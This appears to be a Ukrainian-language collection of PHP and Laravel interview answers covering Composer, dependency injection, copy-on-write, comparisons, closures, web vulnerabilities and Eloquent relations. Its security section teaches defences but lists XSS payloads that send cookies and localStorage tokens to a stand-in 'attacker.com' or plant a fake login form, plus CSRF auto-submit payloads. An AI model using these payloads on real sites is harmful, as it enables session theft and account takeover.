## PHP Junior

https://gist.github.com/GubaEvgeniy/988f9b7910c87250fa05c1bdb02754f6 (1-37 answers)

### 1. Що таке Composer?

<details>
<summary>Розкрити:</summary>

**Composer** — це менеджер залежностей для PHP (як `npm` для JavaScript).

Простими словами:
- ти пишеш, які бібліотеки потрібні проєкту;
- Composer їх завантажує;
- фіксує точні версії;
- підключає автозавантаження класів.

Що він дає на практиці:
- встановлення пакетів з [Packagist](https://packagist.org/);
- керування версіями (`^`, `~`, конкретні версії);
- однакове оточення для всієї команди через `composer.lock`;
- autoload через PSR-4 (`vendor/autoload.php`);
- скрипти (`post-install-cmd`, `test` тощо).

Основні файли:
- `composer.json` — декларація залежностей і налаштувань проєкту;
- `composer.lock` — зафіксовані конкретні версії (щоб у всіх ставилось однаково);
- `vendor/` — встановлені пакети + autoload.

Базові команди:
- `composer init` — створити `composer.json`;
- `composer require monolog/monolog` — додати пакет;
- `composer install` — встановити з `lock`;
- `composer update` — оновити залежності;
- `composer remove vendor/package` — прибрати пакет;
- `composer dump-autoload` — перебудувати автозавантаження.

Дуже короткий приклад:

```json
{
  "require": {
    "monolog/monolog": "^3.0"
  }
}
```

```php
require __DIR__ . '/vendor/autoload.php';
```

І можна використовувати класи пакета без ручних `require` кожного файлу.

</details>

### 2. Dependency Injection і Dependency Inversion

<details>
<summary>Розкрити:</summary>

**Dependency Injection (впровадження залежностей)** — залежність не створюють усередині класу (`new`), а передають ззовні: конструктор, метод або сеттер.

**Dependency Inversion (інверсія залежностей, принцип SOLID-D)** — залежність від **абстракції** (інтерфейс), а не від конкретного класу. Яку саме реалізацію підставити, задають у композиційному корені (у Laravel — зазвичай у `AppServiceProvider::register()` через `bind` / `singleton`).

| | Dependency Injection | Dependency Inversion |
|---|----------------------|----------------------|
| Питання | Хто створює залежність? | Від чого залежить тип у коді? |
| «Так» | Передали в конструктор / метод | У сигнатурі інтерфейс, не конкретний клас |

У Laravel вони часто разом: контролер приймає **інтерфейс** (інверсія), сервіс-контейнер **підставляє реалізацію** (ін’єкція).

**Dependency Injection — погано** (немає injection):

```php
class OrderController extends Controller
{
    public function store(Request $request)
    {
        $mailer = new SmtpMailer(); // created inside — not Dependency Injection
        $mailer->send($request->user());
    }
}
```

**Dependency Injection — добре:**

```php
class OrderController extends Controller
{
    public function __construct(private Mailer $mailer) {}

    public function store(Request $request)
    {
        $this->mailer->send($request->user());
    }
}
```

**Dependency Inversion** — залежність від контракту замість конкретного класу:

```php
// weaker: tied to concrete class
public function __construct(private SmtpMailer $mailer) {}

// better: depends on abstraction (Dependency Inversion)
public function __construct(private MailerContract $mailer) {}
```

```php
// AppServiceProvider::register() — wire implementation to the contract
$this->app->bind(MailerContract::class, SmtpMailer::class);
```

`new` у контролері для сервісів зазвичай порушує **Dependency Injection**; якщо це конкретний клас — часто ще й **Dependency Inversion**. Винятки — прості локальні об’єкти (DTO, value object), де `new` не про інфраструктурну залежність.

**Не плутати з Gang of Four:** Dependency Injection не входить до класичних 23 патернів GoF; Dependency Inversion — це принцип SOLID, а не патерн GoF.

</details>

### 3. Що таке copy-on-write у PHP?

<details>
<summary>Розкрити:</summary>

**Copy-on-write** — це оптимізація пам'яті в PHP: коли ти робиш присвоєння масиву (`$b = $a`), фізична копія не створюється одразу. Копія створюється тільки в момент, коли одну з копій змінюють.

Суть для middle:
- ззовні це поводиться як "передача/присвоєння за значенням";
- під капотом дані можуть тимчасово ділити одну структуру;
- при першому записі (`write`) відбувається відокремлення копії.

Коли застосовується:
- автоматично для масивів і рядків при звичайному присвоєнні/передачі без `&`;
- вручну "вмикати" нічого не треба — це частина роботи рушія PHP;
- корисно розуміти для продуктивності: менше зайвих копій, поки немає змін.

1) Базовий приклад (масив):

```php
$a = [1, 2, 3];
$b = $a;      // no full copy yet (copy-on-write)
$b[] = 4;     // first write -> separation happens here

var_dump($a); // [1, 2, 3]
var_dump($b); // [1, 2, 3, 4]
```

2) У функції без `&`:

```php
function addItem(array $items): void
{
    $items[] = 99; // local write, original array is unchanged
}

$source = [10, 20];
addItem($source);

var_dump($source); // [10, 20]
```

3) Відмінність від посилання (`&`):

```php
$a = [1, 2];
$b =& $a;     // same storage, not copy-on-write behavior
$b[] = 3;

var_dump($a); // [1, 2, 3]
var_dump($b); // [1, 2, 3]
```

Коротка шпаргалка:
- `$b = $a` (масив): логічно копія, фізично копія відкладається до першої зміни;
- `$b =& $a`: обидві змінні працюють з одним і тим самим сховищем;
- для об'єктів `=` не робить копію об'єкта, а копіює handle (ідентифікатор посилання на той самий об'єкт), для нової копії потрібен `clone`.

</details>

### 4. `isset()` і `empty()`

<details>
<summary>Розкрити:</summary>

**`isset($x)`** повертає `true`, лише якщо змінна **існує** і значення **не** `null`. Це **не** перевірка «порожньо для людини»: `''`, `0`, `'0'`, `false` для `isset` вважаються **встановленими**.

| Ситуація | `isset()` |
|----------|-----------|
| Змінної немає (не оголошена) | `false` |
| `$x = null;` | `false` |
| `$x = '';` | `true` |
| `$x = 0;` або `$x = 0.0;` | `true` |
| `$x = '0';` | `true` |
| `$x = false;` | `true` |
| `$x = [];` | `true` |

Для масивів: `isset($arr['key'])` дає `false`, якщо ключа **немає** або значення **`null`**. Щоб відрізнити «ключа немає» від «ключ є, але `null`», використовують `array_key_exists('key', $arr)`.

**Окремого типу `undefined` у PHP немає** (на відміну від JavaScript): є лише «змінна не встановлена» та значення `null`.

---

**`empty($x)`** повертає `true`, якщо значення вважається **порожнім** за правилами PHP. Для **неіснуючої** змінної також `true` (перевірка через `empty()` не генерує попередження так, як прямий доступ до неіснуючої змінної).

| Значення / ситуація | `empty()` |
|---------------------|-----------|
| Змінної немає | `true` |
| `null` | `true` |
| `false` | `true` |
| `0` (int) | `true` |
| `0.0` (float) | `true` |
| `'0'` (рядок) | `true` |
| `''` (порожній рядок) | `true` |
| `[]` (порожній масив) | `true` |

Зазвичай **`empty()` → `false`** (не порожнє): ненульові числа; непорожні рядки (`' '`, `'00'`, `'0.0'`, `'false'` тощо); `true`; масив з елементами; типовий **об'єкт** (`empty($obj)` зазвичай `false`, навіть для `new stdClass()`).

---

**Не плутати:** `isset('')` і `isset(0)` — **`true`**, а `empty('')` і `empty(0)` — **`true`**. Для форм і query-параметрів часто беруть `empty()`; для строгої логіки краще явні перевірки (`=== null`, `array_key_exists`, валідація).

</details>

### 5. `==` і `===` у PHP

<details>
<summary>Розкрити:</summary>

**`==` / `!=`** — нестроге порівняння: PHP може **привести типи** перед перевіркою рівності.

**`===` / `!==`** — строге: **`true`**, лише якщо **типи збігаються** і **значення збігаються** (без juggling для «змісту»).

| | `==` | `===` |
|---|------|-------|
| Приведення типів | Так | Ні |
| Різні типи (наприклад `5` і `'5'`) | Може бути `true` | Зазвичай `false` |
| Типовий вибір у проді для скалярів | Рідко | **За замовчуванням** |

Приклади (результат виразу):

| Вираз | Результат |
|-------|-----------|
| `5 === 5` | `true` |
| `5 === '5'` | `false` |
| `5 == '5'` | `true` |
| `0 === false` | `false` |
| `0 == false` | `true` |
| `null === ''` | `false` |
| `null == ''` | `true` |
| `0 == 'php'` | `true` (пастка: рядок → 0) |
| `0 === 'php'` | `false` |

Масиви:

| Вираз | Результат |
|-------|-----------|
| `[1, 2] === [1, 2]` | `true` |
| `[1, 2] == [1, 2]` | `true` |
| `['1', 2] === [1, 2]` | `false` (різний тип елемента) |
| `['1', 2] == [1, 2]` | `true` |

Об'єкти:

| Вираз | Результат |
|-------|-----------|
| `$a === $b` (той самий екземпляр) | `true` |
| `$a === clone $a` | `false` |
| `$a == $b` (різні об'єкти, ті самі властивості) | залежить від вмісту (порівняння властивостей) |

**Практика:** для перевірок з форм, API, `null` і чисел майже завжди **`===` / `!==`**, щоб уникнути пасток з `'0'`, `''` і `0`.

</details>

### 6. Анонімна функція: `function ($a, $b)` і `use ($name)`

<details>
<summary>Розкрити:</summary>

У PHP замикання **не бачить** змінні зовнішнього scope автоматично — їх треба явно імпортувати через **`use`**. Параметри в **`function (...)`** і змінні в **`use (...)`** — це **різні речі**, не дубль.

| | `function ($a, $b) { }` | `use ($name) { }` |
|---|-------------------------|-------------------|
| Коли з'являються значення | У момент **виклику**: `$fn('Anna', 1)` | У момент **створення** closure (захоплення з оточення) |
| Хто «передає» | Той, хто **викликає** замикання | Лексичне оточення, де closure **оголошено** |
| Типовий сенс | Дані, що **змінюються** від виклику до виклику | Конфіг, контекст батька, те що фіксується разом з closure |

**Параметри — при виклику:**

```php
$greet = function (string $name): void {
    echo "Hello, $name!";
};
$greet('Anna'); // value passed at call time
```

**`use` — з оточення на момент створення:**

```php
$name = 'World';
$f = function () use ($name): void {
    echo "Hello, $name!";
};
$f(); // uses captured $name from when closure was created
```

**Разом:** фіксований префікс з `use`, повідомлення — аргумент при виклику.

```php
$prefix = '[LOG] ';
$log = function (string $message) use ($prefix): void {
    echo $prefix . $message;
};
```

За замовчуванням `use ($x)` копіює **за значенням** при створенні; для посилання на змінну — `use (&$x)`.

</details>

## PHP Middle

### 1. Як передаються змінні (за значенням або за посиланням)?

<details>
<summary>Розкрити:</summary>

Коротко:
- Скалярні та масиви — логічно "за значенням", але під капотом через copy-on-write (реальна копія робиться тільки при зміні).
- Об'єкти — у змінній зберігається ідентифікатор/handle на об'єкт; при присвоєнні копіюється handle, тому обидві змінні дивляться на той самий об'єкт.
- Явне посилання робиться через `&` (і для параметрів, і для присвоєння).

1) Скаляр/масив: copy-on-write

```php
$a = [1, 2, 3];
$b = $a;      // поки що без фізичної копії
$b[] = 4;     // тут відбудеться відокремлення (копія для $b)
var_dump($a); // [1,2,3]
var_dump($b); // [1,2,3,4]
```

Тобто поводиться як "за значенням", але оптимізовано.

2) Об'єкти: shared handle

```php
$o1 = new stdClass();
$o1->x = 10;
$o2 = $o1;     // копія handle, не новий об'єкт
$o2->x = 99;
echo $o1->x;   // 99
```

Це не "посилання &", але ефект схожий: зміни видно через обидві змінні, бо об'єкт один.

Якщо потрібна окрема копія об'єкта:

```php
$o3 = clone $o1;
```

3) Явна передача за посиланням (`&`)

Параметр функції:

```php
function inc(&$n) {
    $n++;
}

$x = 5;
inc($x);
echo $x; // 6
```

Посилальне присвоєння:

```php
$a = 10;
$b =& $a;
$b = 20;
echo $a; // 20
```

4) У функціях без `&`

```php
function change($arr) {
    $arr[] = 100;
}

$x = [1,2];
change($x);
var_dump($x); // [1,2]
```

Без `&` зовнішня змінна не зміниться (для масиву/скаляра).

Для об'єкта навіть без `&` можна змінити його стан:

```php
function touchObj($obj) {
    $obj->flag = true;
}

$o = new stdClass();
touchObj($o);
var_dump($o->flag); // true
```

Нюанс: `=` для об'єктів копіює handle (посилання на той самий об'єкт), а не створює новий об'єкт.

`clone` створює новий об'єкт (новий handle), а не копіює посилання.

```php
$o1 = new stdClass();
$o1->x = 10;

$o2 = clone $o1; // новий об'єкт
$o2->x = 99;

echo $o1->x; // 10
echo $o2->x; // 99
```

Тут посилання з'являється явно через `&`: `$b =& $a` робить `$b` і `$a` двома іменами одного значення.
Без `&` для скалярів було б копіювання за значенням.

</details>

### 2. Які процеси відбуваються, коли користувач вводить у браузері URL?

<details>
<summary>Розкрити:</summary>

Коротка відповідь:
1. Браузер розбирає URL (протокол, домен, шлях).
2. Через DNS знаходить IP сайту.
3. Встановлює з'єднання із сервером (TCP, для HTTPS ще TLS).
4. Надсилає HTTP-запит.
5. Сервер повертає відповідь.
6. Браузер рендерить сторінку і підвантажує ресурси.

Формула:
`URL -> DNS -> з'єднання -> HTTP-запит -> відповідь -> рендер`.

1) Парсинг URL у браузері:
- протокол (`https`)
- хост (`example.com`)
- порт (443 за замовчуванням для HTTPS)
- шлях (`/products`), query, fragment.

2) Перевірка локальних кешів:
- DNS cache
- HTTP cache
- Service Worker (якщо є)
- інколи HSTS політику (чи треба примусово HTTPS).

3) DNS-резолв (домен -> IP):
- браузер питає OS resolver
- далі DNS-сервер
- отримує IP (A/AAAA запис).

4) Встановлення з'єднання:
- TCP handshake (3-way)
- для HTTPS: TLS handshake (сертифікат, шифрування, узгодження ключів)
- перевірка сертифіката (CA, домен, строк дії).

5) Надсилання HTTP-запиту:
- метод `GET`
- шлях `/products`
- заголовки (`Host`, `User-Agent`, `Accept`, `Cookie` тощо).

6) Обробка на сервері:
- веб-сервер (Nginx/Apache) приймає запит
- передає у застосунок (PHP-FPM/Laravel)
- роутинг -> middleware -> controller -> бізнес-логіка
- за потреби звернення до БД/кешу/інших сервісів.

7) Відповідь сервера:
- статус (`200`, `301`, `404`, ...)
- заголовки (`Content-Type`, `Cache-Control`, `Set-Cookie`, ...)
- тіло (HTML/JSON/файл).

8) Браузер обробляє відповідь:
- якщо редірект (`301/302/307`) — робить новий запит на `Location`
- якщо HTML — парсить DOM
- завантажує підресурси (CSS/JS/зображення/шрифти) окремими запитами
- виконує JS, будує render tree, layout, paint, compositing.

9) Відображення сторінки + подальші запити:
- XHR/fetch до API
- lazy-load ресурсів
- WebSocket/SSE тощо.

Коротка формула:
`URL -> DNS -> TCP/TLS -> HTTP request -> backend -> HTTP response -> parse/render -> assets/API`.

</details>

### 3. Що таке варіативна функція або splat-оператор?

<details>
<summary>Розкрити:</summary>

Коротко:

Варіативна функція — це функція, яка може приймати довільну кількість аргументів.
У PHP це робиться через splat-оператор `...`.

1) Прийом багатьох аргументів у функції:

```php
function sum(int ...$numbers): int
{
    return array_sum($numbers);
}

echo sum(1, 2, 3);       // 6
echo sum(10, 20, 30, 5); // 65
```

`...$numbers` збирає всі передані аргументи в масив `$numbers`.

2) "Розпакування" масиву в аргументи:

```php
function greet(string $name, int $age): void
{
    echo "$name, $age";
}

$data = ['Yurii', 25];
greet(...$data); // те саме, що greet('Yurii', 25)
```

Тут `...$data` робить навпаки: розкладає масив на окремі аргументи.

3) У методах і конструкторах — так само:

```php
class Logger
{
    public function log(string ...$messages): void
    {
        foreach ($messages as $m) {
            echo $m . PHP_EOL;
        }
    }
}
```

Різниця в один рядок:
- `function f(...$args)` — збір багатьох аргументів;
- `f(...$array)` — розпакування масиву в аргументи.

</details>

### 4. Що таке OWASP?

<details>
<summary>Розкрити:</summary>

OWASP — спільнота, яка написала best practices, щоб уникнули уразливостей для сайтів.

Для чого він:
- дає зрозумілий список найчастіших вразливостей (sql інєкція й інші...);
- показує, як їх перевіряти і як виправляти;
- дає стандарти безпеки, щоб команда говорила "однією мовою".
</details>

### 5. Які типи вразливостей знаєте? Як від них захищатися?

<details>
<summary>Розкрити:</summary>

**1. SQL Injection**  
Суть: значення з фронту (user input) потрапляє у SQL як частина запиту.  
Тоді БД може інтерпретувати введення не як рядок-дані, а як SQL-код.

Наприклад, якщо робити конкатенацію:

```php
$email = $_POST['email'] ?? '';
$sql = "SELECT * FROM users WHERE email = '$email'"; // vulnerable
$user = $pdo->query($sql)->fetch();
```

### Рішення для raw PHP (PDO)

- тільки prepared statements (`prepare + execute`)
- використовувати плейсхолдери `?` або `:name`
- не конкатенувати user input у SQL-рядок

```php
$email = $_POST['email'] ?? '';
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
$stmt->execute(['email' => $email]);
$user = $stmt->fetch();
```

Prepared statements — це коли SQL-запит готується окремо від даних (PDO extension).  
Тобто структура SQL фіксована, а значення підставляються як параметри.

### Рішення для Laravel

**ORM (Eloquent)**  
Eloquent не робить ручну конкатенацію SQL, а формує запит і передає значення окремо як bindings.

**Тобто Eloquent вставляє це як літерал, а не частину SQL коду, "грубо кажучи, тип даних !SQL код".
Для Query Builder аналогічно**

```php
$user = User::where('email', $email)->first();
```

Під капотом (спрощено):
- SQL шаблон: `SELECT * FROM users WHERE email = ?`
- bindings: `[$email]`
- далі виконується prepared statement, тому input не стає SQL-кодом.

**Query Builder**  
Query Builder працює так само: збирає SQL окремо і значення окремо (bindings).

```php
$user = DB::table('users')
    ->where('email', $email)
    ->first();
```

Під капотом (спрощено):
- SQL шаблон: `SELECT * FROM users WHERE email = ?`
- bindings: `[$email]`
- виконання через prepared statement.

**2. XSS (Cross-Site Scripting)**  
Суть: на сторінці виконується шкідливий JS.  
Приклад: коментар вивели без екранування HTML.  
Чому небезпечно: крадіжка токенів/даних, підміна UI, дії від імені користувача.  
Захист: екранування виводу, CSP, санітизація HTML, `HttpOnly` для cookies.

Екранування — це коли небезпечні HTML-символи перетворюються в безпечний текст.  
Наприклад, `<` стає `&lt;`, `>` стає `&gt;`, `"` стає `&quot;`, `'` стає `&#039;`.

Як це працює:
- користувач вводить: `<script>alert('XSS')</script>`
- виконуємо екранування через `htmlspecialchars(...)`
- браузер бачить: `&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;`
- у результаті це відображається як текст, а не виконується як HTML / JS

Тобто екранування не "видаляє" символи, а робить так, щоб браузер не сприймав їх як код.

```php
// vulnerable
echo "<div>" . $_POST['comment'] . "</div>";

// safe
$comment = $_POST['comment'] ?? '';
echo "<div>" . htmlspecialchars($comment, ENT_QUOTES, 'UTF-8') . "</div>";
```

| № | Тип атаки | Приклад | Результат |
|---|-----------|---------|-----------|
| 1 | Basic XSS | `<script>alert('XSS')</script>` | Виконується JS у браузері користувача |
| 2 | Крадіжка cookies | `<script>fetch('https://attacker.com?c=' + document.cookie)</script>` | Відправка cookies атакуючому (якщо cookie НЕ HttpOnly) |
| 3 | Image XSS | `<img src=x onerror="alert('XSS')">` | JS запускається через HTML attribute |
| 4 | Крадіжка JWT / LocalStorage | `<script>fetch('https://attacker.com?token=' + localStorage.token)</script>` | Викрадення access token |
| 5 | Fake Login Form | `<script>document.body.innerHTML = '<form action="https://attacker.com"><input name="password"></form>';</script>` | Користувач вводить пароль у фейкову форму |
| 6 | Stored XSS | `<script>alert('stored')</script>` | Виконується у ВСІХ користувачів, зберігається в БД |

**3. CSRF (Cross-Site Request Forgery) - міжсайтова підробка запиту**  
Сценарій атаки (як це працює):

1. Користувач логіниться на `bank.com`, сервер (bank.com) створює сесію, відправляє користувачу, браузер зберігає у cookie:
   `SESSION_ID=123`.
2. Потім користувач відкриває сторонній сайт (реклама, посилання, вкладка).
3. На цій сторінці є прихована форма або скрипт, що відправляє запит на `bank.com/transfer`.
4. Браузер **автоматично додає cookies** (так працює браузер) до запитів на `bank.com`, тому разом із запитом піде `SESSION_ID=123`.
5. Сервер бачить валідну сесію і вважає, що дію виконав сам користувач.

Результат: може виконатись небезпечна дія (наприклад, переказ коштів).

### ✅ Як захищає CSRF token

Сервер:
1. Генерує CSRF token і зберігає його у session (bank.com).
2. Сервер повертає HTML сторінку з вшитим у форму csrf токеном:
   `<input type="hidden" name="csrf" value="ABC123">`
3. Користувач клікає на `Submit` форми й сервер перевіряє csrf токен.

Хакерський сайт не може прочитати цей token, тому підроблений запит відхиляється.

Laravel:
- middleware: `VerifyCsrfToken`
- у Blade-формах: `@csrf`

### 🧨 Основні сценарії атак

| Case | Тип атаки | Payload | Що відбувається | Результат |
|------|-----------|---------|-----------------|-----------|
| 1 | Fake Form | `<form action="https://bank.com/transfer" method="POST">` | Форма відправляється від імені user | ✅ Переказ грошей |
| 2 | Auto Submit | `<script>document.forms[0].submit()</script>` | JS автоматично сабмітить форму | ✅ Дія без кліку |
| 3 | Image GET | `<img src="https://site.com/delete?id=5">` | Браузер робить GET автоматично | 💀 Видалення ресурсу |
| 4 | Change Password | POST на `/change-password` | Cookie додається автоматично | ✅ Зміна пароля |
| 5 | Email Change | POST на `/change-email` | Сервер думає що це user | 💀 Захоплення акаунта |

---

**4. Broken Access Control (IDOR)**  
Суть: користувач отримує доступ до чужих ресурсів через підміну ID.  
Приклад: `/orders/123` відкриває чуже замовлення без перевірки власника.  
Чому небезпечно: витік і модифікація чужих даних.  
Захист: перевірка авторизації на сервері для кожного ресурсу, policies/gates, не довіряти ID з фронта.

```php
// vulnerable
$order = Order::find($_GET['id']);

// safe
$order = Order::where('id', $_GET['id'])
    ->where('user_id', $authUser->id)
    ->firstOrFail();
```

**5. Неправильна аутентифікація/сесії**  
Суть: слабкі паролі, відсутній rate-limit, небезпечні cookies.  
Приклад: без ліміту спроб можна брутфорсити акаунт.  
Чому небезпечно: захоплення акаунтів.  
Захист: `bcrypt/argon2`, MFA, rate-limit, `Secure + HttpOnly + SameSite`, регенерація `session_id` після логіну.

```php
// safe password + session
$hash = password_hash($_POST['password'], PASSWORD_ARGON2ID);
if (password_verify($_POST['password'], $hash)) {
    session_regenerate_id(true);
}
```

**6. Небезпечне завантаження файлів** 
Суть: приймаються файли без перевірок.  
Приклад: завантажили шкідливий скрипт під виглядом зображення.  
Чому небезпечно: виконання коду або зараження контенту.  
Захист: whitelist MIME/розширень, перевірка розміру, зберігання поза `public`, рандомні імена, сканування.

```php
$f = $_FILES['file'];
$allowed = ['image/jpeg' => 'jpg', 'image/png' => 'png'];
$mime = mime_content_type($f['tmp_name']);
if (!isset($allowed[$mime])) { exit('Invalid file type'); }
$name = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];
move_uploaded_file($f['tmp_name'], __DIR__ . '/storage/uploads/' . $name);
```

**7. Витік секретів / Security Misconfiguration**  
Суть: неправильні налаштування або секрети в репозиторії.  
Приклад: `.env` у git, debug mode на проді.  
Чому небезпечно: доступ до БД, API, внутрішніх даних.  
Захист: секрети тільки в env/secret manager, вимкнений debug, регулярний аудит конфігів.

```env
APP_DEBUG=false
# secrets only in environment / secret manager, not in git
```

**8. Вразливі залежності**  
Суть: використання пакетів з відомими CVE.  
Приклад: стара бібліотека з критичною дірою.  
Чому небезпечно: атака через сторонній код.  
Захист: регулярні оновлення, `composer audit`, моніторинг CVE.

```bash
composer audit
composer update
```

</details>

## Laravel

### 1. Як під капотом реалізовується Service Container

<details>
<summary>Розкрити:</summary>

Нижче спрощена реалізація контейнера з двома режимами реєстрації:
- `bind` — новий об'єкт при кожному `make()`
- `singleton` — один об'єкт на ключ (кешується в `$instances`)

```php
<?php

declare(strict_types=1);

use Closure;

final class Container
{
    private array $bindings = [];
    private array $instances = [];

    public function singleton(string $abstract, Closure $concrete): void
    {
        $this->bindings[$abstract] = [
            'concrete' => $concrete,
            'isShared' => true,
        ];
    }

    public function bind(string $abstract, Closure $concrete): void
    {
        $this->bindings[$abstract] = [
            'concrete' => $concrete,
            'isShared' => false,
        ];
    }

    public function make(string $abstract): object
    {
        if (isset($this->instances[$abstract])) {
            return $this->instances[$abstract];
        }

        if (! isset($this->bindings[$abstract])) {
            throw new \InvalidArgumentException("Not bound: {$abstract}");
        }

        // Lazy creation: object is created only on make()
        $object = ($this->bindings[$abstract]['concrete'])();

        if ($this->bindings[$abstract]['isShared']) {
            $this->instances[$abstract] = $object;
        }

        return $object;
    }
}
```

Використання і результат:

```php
interface SingltoneInterface {}
class SingltoneClass implements SingltoneInterface {}

interface BindInterface {}
class BindClass implements BindInterface {}

$c = new Container();

// register
$c->singleton(SingltoneInterface::class, fn() => new SingltoneClass());
$c->bind(BindInterface::class, fn() => new BindClass());

// singleton
$s1 = $c->make(SingltoneInterface::class);
$s2 = $c->make(SingltoneInterface::class);

var_dump($s1 === $s2); // true - same reference
var_dump($s1 instanceof SingltoneInterface); // true

// bind (transient)
$b1 = $c->make(BindInterface::class);
$b2 = $c->make(BindInterface::class);

var_dump($b1 === $b2); // false - different objects
var_dump($b1 instanceof BindInterface); // true
```

Коротко по логіці:

- **`singleton()` і `bind()`**: тільки реєструють залежність у контейнері, нічого не створюють, повертають `void`.
- **`make()`**: створює об'єкт під час резолву і повертає `object`.

- **`$bindings`**: масив для зберігання залежностей.

  Приклад, що лежить у `$bindings`:

```php
[
    'App\Contracts\LoggerInterface' => [
        'concrete' => fn () => new FileLogger(),
        'isShared' => true,
    ],
]
```

- **`$instances`**: масив тільки для `singleton`, де зберігається вже створений об'єкт.

  Приклад, що лежить у `$instances` після першого `make()`:

```text
[
    'App\Contracts\LoggerInterface' => екземпляр FileLogger (той самий об’єкт при наступних make)
]
```

- **Важливо**: це не GoF Singleton у класі, а container-level `shared singleton` (in-memory cache в RAM на час життя контейнера).

</details>

### 2. Які є зв’язки і як вони реалізуються в Laravel?

<details>
<summary>Розкрити:</summary>

Основні зв’язки Eloquent:
- `hasOne` / `belongsTo` (One To One)
- `hasMany` / `belongsTo` (One To Many)
- `belongsToMany` (Many To Many)
- `hasOneThrough`, `hasManyThrough`
- поліморфні: `morphOne`, `morphMany`, `morphTo`, `morphToMany`, `morphedByMany`

Приклад найуживаніших:

```php
// One To Many: Post -> Comments
class Post extends Model
{
    public function comments()
    {
        return $this->hasMany(Comment::class);
    }
}

class Comment extends Model
{
    public function post()
    {
        return $this->belongsTo(Post::class);
    }
}

// Many To Many: User <-> Role
class User extends Model
{
    public function roles()
    {
        return $this->belongsToMany(Role::class); // pivot: role_user
    }
}

class Role extends Model
{
    public function users()
    {
        return $this->belongsToMany(User::class);
    }
}
```

Як використовуються:

```php
Post::with('comments')->get();         // eager loading
$post->comments;                       // доступ до зв'язку
$post->comments()->create([...]);      // створення через relation
User::whereHas('roles')->get();        // фільтр по зв'язку
```

Детальніше про `hasOneThrough` і `hasManyThrough`:

### `hasOneThrough` (один через проміжну модель)
Використовується, коли хочемо отримати **одну кінцеву модель** через **одну проміжну**.

Приклад: `Mechanic -> Car -> Owner`  
Механік пов'язаний з авто, авто пов'язане з власником, а нам треба одразу власника механіка.

```php
class Mechanic extends Model
{
    public function owner()
    {
        return $this->hasOneThrough(Owner::class, Car::class);
    }
}

class Car extends Model
{
    public function mechanic()
    {
        return $this->belongsTo(Mechanic::class);
    }

    public function owner()
    {
        return $this->belongsTo(Owner::class);
    }
}
```

Використання:

```php
$owner = Mechanic::find(1)->owner;
```

### `hasManyThrough` (багато через проміжну модель)
Використовується, коли хочемо отримати **багато кінцевих моделей** через **одну проміжну**.

Приклад: `Country -> User -> Post`  
Країна має багато користувачів, користувачі мають багато постів, треба одразу всі пости країни.

```php
class Country extends Model
{
    public function posts()
    {
        return $this->hasManyThrough(Post::class, User::class);
    }
}

class User extends Model
{
    public function country()
    {
        return $this->belongsTo(Country::class);
    }

    public function posts()
    {
        return $this->hasMany(Post::class);
    }
}
```

Використання:

```php
$posts = Country::find(1)->posts;
```

Коротко:
- `hasOneThrough` = одна модель через проміжну.
- `hasManyThrough` = колекція моделей через проміжну.
- Обидва зв'язки зменшують ручні `join` і роблять код читабельнішим.

</details>

### 3. Що таке поліморфні зв’язки, як вони працюють?

<details>
<summary>Розкрити:</summary>

Поліморфний зв’язок = одна модель може належати різним типам моделей.

Приклад: одна таблиця `images` для аватарки `User` і прев’ю `Post`.

У таблиці `images`:
- `imageable_id`
- `imageable_type`

Тобто один запис `Image` може посилатись або на `User`, або на `Post`.

```php
class User extends Model
{
    public function image()
    {
        return $this->morphOne(Image::class, 'imageable');
    }
}

class Post extends Model
{
    public function image()
    {
        return $this->morphOne(Image::class, 'imageable');
    }
}

class Image extends Model
{
    public function imageable()
    {
        return $this->morphTo();
    }
}
```

Використання:

```php
$userImage = User::find(1)->image;   // одна Image для User
$postImage = Post::find(10)->image;  // одна Image для Post

$owner = Image::find(5)->imageable;  // поверне або User, або Post
```

Це прибирає дублювання таблиць (`user_images`, `post_images`) і дає одну універсальну модель.

</details>

